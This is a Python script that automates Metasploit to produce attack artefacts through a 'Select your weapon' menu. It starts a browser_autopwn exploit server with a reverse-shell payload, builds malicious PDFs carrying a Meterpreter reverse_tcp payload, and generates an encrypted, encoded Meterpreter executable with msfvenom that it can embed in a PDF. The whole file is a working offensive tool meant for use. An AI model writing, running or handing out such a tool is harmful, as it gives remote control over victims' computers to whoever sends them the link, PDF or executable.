# Packages needed. All of these come by default with Python
import subprocess
import re
import socket
import getpass

embedding=0 # Global variable, declared here because it is used by more than one function
option='0' # Global variable to store the user's decisions.

def get_local_ip():  # Use to obtain the IP of the host
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))  # Connection to Google's DNS 8.8.8.8
    ip = s.getsockname()[0]  # The name of the socket is the IP address of the client.
    s.close()  # CLose the connection.
    return ip  # It returns the value to be used in the code


# The next function uses the browser_pwn vulnerability, and loads different exploits that will be downloaded
# when a client connects to the link provided by the metasploit module.
def malicious_link(uripath):

    own_ip = get_local_ip()
# Start msfconsole and run the browser_pwn module with the specified options
    command = f'use auxiliary/server/browser_autopwn; set SRVHOST {own_ip}; set URIPATH /{uripath}; set PAYLOAD generic/shell_reverse_tcp; set LHOST {own_ip}; run -j'
    msfconsole_process = subprocess.Popen(['msfconsole', '-q', '-x', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    error = msfconsole_process.stderr.readline().decode().strip()
    #  The following error occurs because metasploit executes the stty command on a file that is not a system terminal.
    if error:
        if 'stty: standard input: Inappropriate ioctl for device' in error:
            subprocess.run(['stty', '-F', '/dev/tty', '-T'])

    lock = 1  # To indicate the session with metasploit was created. Used as a control.
    while lock == 1:
        output = msfconsole_process.stdout.readline()  # Read the output the module is presenting.
        if not output and msfconsole_process.poll() is not None:
            break
        # The next line searches for the moment in which the link is presented.
        # This occurs after loading all modules that can be exploited,
        # so searching for this expression is a way to ensure that the process is not interrupted
        find = re.search('http://'+own_ip+':8080/'+uripath+'+', output.decode('utf-8'))
        if find:  # If the expression is found, it means all the modules were successfully uploaded
            # and is running as a server in the port 8080.
            link = find.group(0) # It returns the entire expression in which the previous sentence was found.
            print(f'Resulting link: {link}')
            lock=0  # Free the control variable to stop reading the output.


def pdf(name, path,path_exe):  # Function to create a malicious PDF.
    # It receives the name of the PDF, the path to the PDF the user wants to make malicious and, for the cases in which
    # an executable is being embedded in the PDF, it expects a path to that executable.
    own_ip = get_local_ip()  # Obtain the host's IP
    current_user = getpass.getuser()  # Get the user running the script
    name = name+'.pdf'  # The user will only write the name of the PDF, not the extension
    old_location = '/home/'+current_user+'/.msf4/local/'+name  # Default location to which the module sends the resulted document
    new_location = '/home/'+current_user+'/Desktop'  #  The document will be copied in the user's Desktop

    if(embedding==0):  # Uses the control variable to know if the function is being called to embed an executable or not
        #  The next line is the command used to send all the specifications to metasploit, i.e., the module and options.
        #  The command used depends on the purpose the user has.
        command = f'use windows/fileformat/adobe_pdf_embedded_exe; set FILENAME {name}; set INFILENAME{path}; ' \
              f'set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT 1312; set LHOST {own_ip}; run -j'

    if(embedding==1):  # If the variable is in one, it means the function is being called to inject an executable in the PDF
        # The next line specifies the module to use and the options, including the path to the executable (EXENAME).
        command = f'use windows/fileformat/adobe_pdf_embedded_exe; set FILENAME {name}; set INFILENAME{path}; ' \
                  f'set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT 1312; set EXENAME {path_exe}; ' \
                  f'set LHOST {own_ip}; run -j'

    # In the following line, the command is sent to the system, using subprocess.
    msfconsole_process=subprocess.Popen(['msfconsole', '-q', '-x', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    error = msfconsole_process.stderr.readline().decode().strip()
    #  The following error occurs because metasploit executes the stty command on a file that is not a system terminal.
    if error:
        if 'stty: standard input: Inappropriate ioctl for device' in error:
            subprocess.run(['stty', '-F', '/dev/tty', '-T'])

    lock = 1 # To indicate the session with metasploit was created. Used as a control.
    while lock == 1:
        output = msfconsole_process.stdout.readline()  # Is readingt he output while the interaction with metasploit is active.
        if not output and msfconsole_process.poll() is not None: # If metasploit is not giving any output, break the loop
            break
        find = re.search(name+' stored at+', output.decode('utf-8'))  # Find the expression that indicates the PDF was created.
        # In this case the expression is: xxx.pdf stored at [default location]
        if find:
            move = ["cp",old_location,new_location]  # This copies the file from its default location to the Desktop
            result = subprocess.run(move, capture_output=True, text=True)
            if result.returncode == 0:
                print("The file is in your desktop. Create a hanlder ot listen on port: 1312\n")
            else:
                print("Error copying file:", result.stderr)
            lock = 0 # Stop reading the output.

def executable(name,key):  # To create an executable file
#  It receives the name of the executable and the encryption key the user wants to encrypt the payload created.

    own_ip = get_local_ip()
    current_user = getpass.getuser()
    name = name + '.exe' # The user will only write the name of the executable, so the extension is added
    path = '/home/' + current_user + '/Desktop/' + name  # The executable will be sent to the user's desktop.
   #  Creation of the executable
    msfvenom = [
        "msfvenom",
        "-a", "x86",
        "--platform", "windows",
        "-p", "windows/meterpreter/reverse_tcp",
        f"LHOST={own_ip}",
        "LPORT=3333",
        "--encrypt", "rc4",
        "--encrypt-key", key,
        "-i", "3",
        "-b", "\\x00",
        "-e", "x86/shikata_ga_nai",
        "-f", "exe",
        "-o", path]
    result = subprocess.run(msfvenom, capture_output=True, text=True)
    if result.returncode == 0:
        print("Executable created. It is now in your desktop")
    # Since this function is used to create an executable that is embedded in a PDF, when the file is created,
    # it is returned so that, in case the user has this purpose, the pdf() function can use it.
        return path
    else:
        print("Error executing command:", result.stderr)
        return '0'



# Next, the user is asked for their choices and the necessary information is requested.
# Then, this information is passed to the respective functions (previously defined)
while option!='5':
    option = input("Select your weapon\n1) Malicious link\n2) Malicious PDF\n3) Malicious Executable\n"
                   "4) Embed EXE into PDF\n5) Exit\n")
    if(option=='1'):
        uripath = input("Specify your URI:\n")
        malicious_link(uripath)

    if (option == '2'):
        name = input("Name of the evil file?\n")
        path = input ("Path to the PDF you want to use\n")
        pdf(name,path,' ')

    if (option == '3'):

        name = input("Name of the executable\n")
        key = input("Please provide an encryption key\n")
        executable(name,key)

    if(option =='4'):
        new = input("It is a new executable?\n1) Yes\n2) No\n")
        if new =='1':
            name = input("Name of the executable\n")
            key = input("Please provide an encryption key\n")
            result = executable(name,key)
            if(result!=0):
                embedding = 1
                name = input("Name of the evil PDF?\n")
                path = input("Path to the PDF you want to use\n")
                pdf(name,path,result)
                embedding=0
        if new =='2':
            embedding=1
            name = input("Name of the evil PDF?\n")
            path = input("Path to the PDF you want to use\n")
            path_exe = input("Provide the path to the executable you want to add to the PDF\n")
            pdf(name, path,path_exe)
            embedding=0


